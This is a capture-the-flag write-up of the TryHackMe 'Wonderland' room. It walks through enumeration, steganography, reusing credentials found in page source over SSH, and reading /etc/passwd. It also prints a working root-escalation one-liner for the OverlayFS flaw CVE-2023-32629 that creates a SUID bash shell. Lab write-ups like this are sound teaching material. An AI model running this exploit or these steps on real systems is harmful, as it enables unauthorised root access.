## [TryHackMe] Wonderland Room Write-Up

*Fall down the rabbit hole and enter wonderland.*

<p align="center">
  <img src="https://i.imgur.com/rhvJ8ft.jpg" alt="wonderland" width="250">
</p>

### Nmap Enumeration
Let's start with an Nmap scan:

```bash
nmap -A -Pn -vv -p- 10.10.244.154
```

| Option | Description |
|---------|-------------|
| `-A`  | Enable OS detection, version detection, script scanning, and traceroute |
| `-Pn` | Treat all hosts as online (skip host discovery) |
| `-v` | Increase verbosity level (use `-vv` or more for greater effect) |
| `-p-` | Scan all ports |

<p align="left">
  <img src="https://github.com/user-attachments/assets/4be11b91-1867-4476-8a3e-e5ec872a1e27" alt="Nmap Scan">
</p>

We have open SSH (22) and HTTP (80) ports. Let's check HTTP first.

<p align="left">
  <img src="https://github.com/user-attachments/assets/126ae06e-c493-4a13-8980-3a3d2c1b76f9" alt="HTTP Page">
</p>

### Inspecting HTTP
Through the Inspector, we find a hardcoded path to an image. Let's check the `/img/` directory for anything interesting.

<p align="left">
  <img src="https://github.com/user-attachments/assets/2b1e9846-0e29-4b36-99e6-63fe727dc282" alt="/img Directory">
</p>

Let's download these images and analyze them for steganography using `binwalk` for `.png` and `steghide` for `.jpg`.

`alice_door.jpg` and `alice_door.png` contained nothing, but `white_rabbit_1.jpg` had a hidden file with a hint.

<p align="left">
  <img src="https://github.com/user-attachments/assets/d009bfd0-a5de-457c-a315-09f53ddf38ce" alt="Binwalk Output">
  <img src="https://github.com/user-attachments/assets/115ce4c7-2e4a-4ea1-8538-8e8c47d6240e" alt="Steghide Output">
</p>

### Directory Enumeration
Not sure what the hint meant, I started scanning with `dirb`.

<p align="left">
  <img src="https://github.com/user-attachments/assets/a0c8d491-b241-4631-86e8-ba3d1f9adbf1" alt="Dirb Scan">
</p>

This revealed a `/r/` directory. Maybe the hint leads us here?

<p align="left">
  <img src="https://github.com/user-attachments/assets/a706236b-f216-444e-973f-290a2c6bc0ad" alt="Rabbit Hole">
  <img src="https://github.com/user-attachments/assets/4bcfb14e-06c3-4f8e-bbb4-f4a0291fb6ba" alt="/r/a/b/b/i/t">
</p>

And yes! I went deeper and deeper into `/r/a/b/b/i/t/` hole, eventually reaching the end.

### Finding Credentials
Inspecting the page source, I found what looked like credentials.

<p align="left">
  <img src="https://github.com/user-attachments/assets/f4a1fffc-5678-41fb-8d1f-cf7a86b4dfa1" alt="Found Credentials">
</p>

Since SSH was open, I tried logging in with them.

<p align="left">
  <img src="https://github.com/user-attachments/assets/9d26a55a-317a-4976-baac-572724532886" alt="SSH Access">
</p>

### Privilege Escalation
Once inside, I checked system details and found that `alice` could execute Python scripts. I looked for privilege escalation vulnerabilities and discovered that Ubuntu 18.04.4 LTS was [vulnerable](https://cert.europa.eu/publications/security-advisories/2023-054/pdf) to OverlayFS exploitation ([CVE-2023-32629](https://www.cvedetails.com/cve/CVE-2023-32629/)).


| Command | Output | Description |
|---------|-------------|-------------|
| `id alice` | ![id](https://github.com/user-attachments/assets/1a692bfd-a209-4e55-9ae6-421e8e188ebd) | Display user ID (UID), group ID (GID), and group memberships for user |
| `ls -la` | ![ls](https://github.com/user-attachments/assets/037ebe61-2324-47e1-8c55-d28b8ad58c62) | List files in a directory, including hidden ones, with details |
| `sudo -l` | ![sudo -l](https://github.com/user-attachments/assets/4ef8a94a-33b4-43fc-a1d5-55acae7e8378) | List commands the current user can run with sudo privileges |
| `cat /etc/passwd` | ![passwd1](https://github.com/user-attachments/assets/1c92be4c-8284-4245-bee3-65c35cb93bd1) ![passwd2](https://github.com/user-attachments/assets/e8416b5e-a62b-4e29-bee9-9fee18362e18) | Show user account information |
| `uname -o`  | ![image](https://github.com/user-attachments/assets/625c9da1-6eef-4ed9-b590-2aba7d4b4bf0) | Display the operating system name |
| `uname -m` | ![image](https://github.com/user-attachments/assets/4a69a767-75d3-4c6c-b742-3dc434974ff6) | Show the system architecture |
| `cat /etc/os-release` | ![image](https://github.com/user-attachments/assets/c7d0be8f-0468-4c34-b567-78d25fa4c89e) | Display OS details such as name and version |

I used this [exploit](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629):

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

<p align="left">
  <img src="https://github.com/user-attachments/assets/4171f1d7-c536-4b52-9a3a-182745f3c027" alt="Root Access">
</p>

### Capturing the Flags
For the user flag, the hint on TryHackMe was *"Everything is upside down here."* I searched the root directory and found it.

<p align="left">
  <img src="https://github.com/user-attachments/assets/c577c6d9-1687-47ef-8d5f-12fb1dd27b8c" alt="Flag 1">
</p>

The root flag was inside `alice`'s home directory all along, but I couldn't access it before privilege escalation.

<p align="left">
  <img src="https://github.com/user-attachments/assets/ae0cc6fd-b9a0-4260-8466-12d0972298f5" alt="Flag 2">
</p>

### Conclusion
That concludes the Wonderland room! It was a fun challenge with interesting enumeration and privilege escalation techniques.

